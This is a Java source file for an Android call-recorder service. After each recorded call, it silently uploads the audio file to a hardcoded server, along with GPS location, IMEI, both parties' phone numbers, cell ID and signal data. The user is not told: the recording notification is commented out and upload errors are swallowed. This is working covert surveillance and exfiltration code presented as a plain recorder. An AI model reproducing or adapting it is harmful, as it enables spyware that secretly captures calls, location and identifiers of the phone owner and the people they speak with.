package com.talentcodeworks.callrecorder;

import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


public class RecordService 
    extends Service
    implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener
{
    private static final String TAG = "CallRecorder";

    public static final String DEFAULT_STORAGE_LOCATION = Environment.getExternalStorageDirectory().getPath()+"/callrecorder";
    private static final int RECORDING_NOTIFICATION_ID = 1;
    private Context context;
    private MediaRecorder recorder = null;
    private boolean isRecording = false;
    private File recording = null;


    private File makeOutputFile (SharedPreferences prefs)
    {
        File dir = new File(DEFAULT_STORAGE_LOCATION);

        // test dir for existence and writeability
        if (!dir.exists()) {
            try {
                dir.mkdirs();
            } catch (Exception e) {
                Log.e("CallRecorder", "RecordService::makeOutputFile unable to create directory " + dir + ": " + e);
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create the directory " + dir + " to store recordings: " + e, Toast.LENGTH_LONG);
                t.show();
                return null;
            }
        } else {
            if (!dir.canWrite()) {
                Log.e(TAG, "RecordService::makeOutputFile does not have write permission for directory: " + dir);
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder does not have write permission for the directory directory " + dir + " to store recordings", Toast.LENGTH_LONG);
                t.show();
                return null;
            }
        }

        // test size

        // create filename based on call data
        //String prefix = "call";
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SS");
        String prefix = sdf.format(new Date());

        // add info to file name about what audio channel we were recording
        int audiosource = Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_SOURCE, "1"));
        prefix += "-channel" + audiosource + "-";

        // create suffix based on format
        String suffix = "";
        int audioformat = Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_FORMAT, "1"));
        switch (audioformat) {
        case MediaRecorder.OutputFormat.THREE_GPP:
            suffix = ".3gpp";
            break;
        case MediaRecorder.OutputFormat.MPEG_4:
            suffix = ".mpg";
            break;
        case MediaRecorder.OutputFormat.RAW_AMR:
            suffix = ".amr";
            break;
        }
        try {
            return File.createTempFile(prefix, suffix, dir);
        } catch (IOException e) {
            Log.e("CallRecorder", "RecordService::makeOutputFile unable to create temp file in " + dir + ": " + e);
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create temp file in " + dir + ": " + e, Toast.LENGTH_LONG);
            t.show();
            return null;
        }


    }

    public void createStatClass(String prefix) throws Exception {

        Context c = getApplicationContext();
        CollectionOfRecords cur = new CollectionOfRecords(c, prefix);
        new MyAsyncTask().execute(cur);
    }

    private class MyAsyncTask extends AsyncTask<CollectionOfRecords, Integer, Double> {
        @Override
        protected Double doInBackground(CollectionOfRecords... params) {
            // TODO Auto-generated method stub
            postData(params[0]);
            Log.i("CallRecorder","Data posted");
            postFile(params[0]);
            Log.i("CallRecorder","File posted");
            return null;
        }
    }

    public void postFile(CollectionOfRecords c)
    {
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        DataInputStream inputStream = null;
        String pathToOurFile = DEFAULT_STORAGE_LOCATION+"/"+c.nameOfFile;
        String urlServer = "http://10.0.0.31/handle_upload.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary =  "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1024*1024;

        try
        {
            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );

            URL url = new URL(urlServer);
            connection = (HttpURLConnection) url.openConnection();

            // Allow Inputs &amp; Outputs.
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);

            // Set HTTP method to POST.
            connection.setRequestMethod("POST");

            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);

            outputStream = new DataOutputStream( connection.getOutputStream() );
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);
            outputStream.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\"" + pathToOurFile +"\"" + lineEnd);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // Read file
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0)
            {
                outputStream.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)

            String serverResponseMessage = connection.getResponseMessage();
            Log.i("Call Recorder",serverResponseMessage);

            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
        }
        catch (Exception ex)
        {
            //Exception handling
        }
    }

    public void postData(CollectionOfRecords c) {
        HttpClient httpclient = new DefaultHttpClient();
        // specify the URL you want to post to
        HttpPost httppost = new HttpPost("http://10.0.0.31/reciever.php");
        try {
            // create a list to store HTTP variables and their values
            List nameValuePairs = new ArrayList();
            // add an HTTP variable and value pair
            nameValuePairs.add(new BasicNameValuePair("latitude", String.valueOf(c.latitude)));
            nameValuePairs.add(new BasicNameValuePair("longitude", String.valueOf(c.longitude)));
            nameValuePairs.add(new BasicNameValuePair("nameOfFile", c.nameOfFile));
            nameValuePairs.add(new BasicNameValuePair("netType", c.netType));
            nameValuePairs.add(new BasicNameValuePair("IMEI", c.IMEI));
            nameValuePairs.add(new BasicNameValuePair("phoneType", c.phoneType));
            nameValuePairs.add(new BasicNameValuePair("oneNumber", c.myPhoneNumber));
            nameValuePairs.add(new BasicNameValuePair("secNumber", c.externalPhoneNumber));
            nameValuePairs.add(new BasicNameValuePair("cellId", String.valueOf(c.cellId)));
            nameValuePairs.add(new BasicNameValuePair("signalStrength", String.valueOf(c.signalStrength)));
           // nameValuePairs.add(new BasicNameValuePair("firsValue", "value1"));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            // send the variable and value, in other words post, to the URL
            HttpResponse response = httpclient.execute(httppost);
            int a=0;
        } catch (ClientProtocolException e) {
            // process execption
        } catch (IOException e) {
            // process execption
        }
    }

    public void onCreate()
    {
        super.onCreate();
        recorder = new MediaRecorder();
        Log.i("CallRecorder", "onCreate created MediaRecorder object");
    }

    public void onStart(Intent intent, int startId) {
        //Log.i("CallRecorder", "RecordService::onStart calling through to onStartCommand");
        //onStartCommand(intent, 0, startId);
        //}

        //public int onStartCommand(Intent intent, int flags, int startId)
        //{
        Log.i("CallRecorder", "RecordService::onStartCommand called while isRecording:" + isRecording);

        if (isRecording) return;

        Context c = getApplicationContext();
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c);

        Boolean shouldRecord = prefs.getBoolean(Preferences.PREF_RECORD_CALLS, false);
        if (!shouldRecord) {
            Log.i("CallRecord", "RecordService::onStartCommand with PREF_RECORD_CALLS false, not recording");
            //return START_STICKY;
            return;
        }

        int audiosource = Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_SOURCE, "1"));
        int audioformat = Integer.parseInt(prefs.getString(Preferences.PREF_AUDIO_FORMAT, "1"));

        recording = makeOutputFile(prefs);
        if (recording == null) {
            recorder = null;
            return; //return 0;
        }

        Log.i("CallRecorder", "RecordService will config MediaRecorder with audiosource: " + audiosource + " audioformat: " + audioformat);
        try {
            // These calls will throw exceptions unless you set the 
            // android.permission.RECORD_AUDIO permission for your app
            recorder.reset();
            recorder.setAudioSource(audiosource);
            Log.d("CallRecorder", "set audiosource " + audiosource);
            recorder.setOutputFormat(audioformat);
            Log.d("CallRecorder", "set output " + audioformat);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            Log.d("CallRecorder", "set encoder default");
            recorder.setOutputFile(recording.getAbsolutePath());
            Log.d("CallRecorder", "set file: " + recording);
            //recorder.setMaxDuration(msDuration); //1000); // 1 seconds
            //recorder.setMaxFileSize(bytesMax); //1024*1024); // 1KB

            recorder.setOnInfoListener(this);
            recorder.setOnErrorListener(this);
            
            try {
                recorder.prepare();
            } catch (java.io.IOException e) {
                Log.e("CallRecorder", "RecordService::onStart() IOException attempting recorder.prepare()\n");
                Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
                t.show();
                recorder = null;
                return; //return 0; //START_STICKY;
            }
            Log.d("CallRecorder", "recorder.prepare() returned");
            
            recorder.start();
            isRecording = true;
            Log.i("CallRecorder", "recorder.start() returned");
            updateNotification(true);
        } catch (java.lang.Exception e) {
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
            t.show();

            Log.e("CallRecorder", "RecordService::onStart caught unexpected exception", e);
            recorder = null;
        }

        return; //return 0; //return START_STICKY;
    }

    public void onDestroy()
    {
        super.onDestroy();

        if (null != recorder) {
            Log.i("CallRecorder", "RecordService::onDestroy calling recorder.release()");
            isRecording = false;
            recorder.release();
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder finished recording call to " + recording, Toast.LENGTH_LONG);
            t.show();


            try {
                createStatClass(recording.getName());
            } catch (Exception e) {
                e.printStackTrace();
            }



            /*
            // encrypt the recording
            String keyfile = "/sdcard/keyring";
            try {
                //PGPPublicKey k = readPublicKey(new FileInputStream(keyfile));
                test();
            } catch (java.security.NoSuchAlgorithmException e) {
                Log.e("CallRecorder", "RecordService::onDestroy crypto test failed: ", e);
            }
            //encrypt(recording);
            */
        }

        updateNotification(false);
    }


    // methods to handle binding the service

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public boolean onUnbind(Intent intent)
    {
        return false;
    }

    public void onRebind(Intent intent)
    {
    }


    private void updateNotification(Boolean status)
    {
        Context c = getApplicationContext();
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c);

        String ns = Context.NOTIFICATION_SERVICE;
        NotificationManager mNotificationManager = (NotificationManager) getSystemService(ns);

        if (status) {
            int icon = R.drawable.rec;
            CharSequence tickerText = "Recording call from channel " + prefs.getString(Preferences.PREF_AUDIO_SOURCE, "1");
            long when = System.currentTimeMillis();
           /*
            Notification notification = new Notification(icon, tickerText, when);
            
            Context context = getApplicationContext();
            CharSequence contentTitle = "CallRecorder Status";
            CharSequence contentText = "Recording call from channel...";
            Intent notificationIntent = new Intent(this, RecordService.class);
            PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);


            mNotificationManager.notify(RECORDING_NOTIFICATION_ID, notification);
            */
        } else {
            mNotificationManager.cancel(RECORDING_NOTIFICATION_ID);
        }
    }

    // MediaRecorder.OnInfoListener
    public void onInfo(MediaRecorder mr, int what, int extra)
    {
        Log.i("CallRecorder", "RecordService got MediaRecorder onInfo callback with what: " + what + " extra: " + extra);
        isRecording = false;
    }

    // MediaRecorder.OnErrorListener
    public void onError(MediaRecorder mr, int what, int extra) 
    {
        Log.e("CallRecorder", "RecordService got MediaRecorder onError callback with what: " + what + " extra: " + extra);
        isRecording = false;
        mr.release();
    }
}
